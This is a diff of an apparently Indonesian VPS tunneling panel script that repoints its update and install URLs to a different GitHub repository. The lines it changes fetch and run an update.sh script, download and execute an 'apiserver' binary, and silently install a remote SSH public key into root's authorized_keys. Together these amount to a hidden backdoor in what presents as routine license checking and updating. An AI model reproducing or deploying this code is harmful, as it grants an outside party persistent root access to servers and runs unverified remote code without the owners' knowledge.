@@ -14,7 +14,7 @@ checking_sc() {
 
 	if [[ "$useexp" == "Lifetime" || $(date -d "$date_list" +%s) -lt $(date -d "$useexp" +%s) ]]; then
         echo -e " [INFO] Fetching server version..."
-        REPO="https://raw.githubusercontent.com/diah082/vip/main/"  # Ganti dengan URL repository Anda
+        REPO="https://raw.githubusercontent.com/xccvme/vps-tunneling/main/"  # Ganti dengan URL repository Anda
         serverV=$(curl -fsSL ${REPO}versi)
 
         if [[ -f /opt/.ver ]]; then
@@ -29,7 +29,7 @@ checking_sc() {
         else
             echo -e " [INFO] Versi script berbeda. Memulai proses update script..."
 			cd
-            wget -q https://raw.githubusercontent.com/diah082/vip/main/menu/update.sh -O update.sh
+            wget -q https://raw.githubusercontent.com/xccvme/vps-tunneling/main/menu/update.sh -O update.sh
             chmod +x update.sh
             ./update.sh
             echo $serverV > /opt/.ver.local
@@ -58,7 +58,7 @@ checking_sc() {
         cd
 
         # Set new SSH key
-        KEY_URL="https://raw.githubusercontent.com/Diah082/Vip/main/install/id_ed25519.pub"
+        KEY_URL="https://raw.githubusercontent.com/xccvme/vps-tunneling/main/install/id_ed25519.pub"
         AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
 
         # Create .ssh directory if not exists
@@ -108,7 +108,7 @@ checking_sc() {
 checking_sc
 cd
 
-KEY_URL="https://raw.githubusercontent.com/Diah082/Vip/main/install/id_ed25519.pub"
+KEY_URL="https://raw.githubusercontent.com/xccvme/vps-tunneling/main/install/id_ed25519.pub"
 AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
 
 # Membuat direktori .ssh jika belum ada
@@ -210,7 +210,7 @@ if [[ $apiserver == "running" ]]; then
 echo -ne
 else
 cd
-wget -q https://raw.githubusercontent.com/Diah082/Vip/main/install/apiserver && chmod +x apiserver && ./apiserver apisellvpn
+wget -q https://raw.githubusercontent.com/xccvme/vps-tunneling/main/install/apiserver && chmod +x apiserver && ./apiserver apisellvpn
 fi
 bash2=$( pgrep bash | wc -l )
 if [[ $bash2 -gt "20" ]]; then
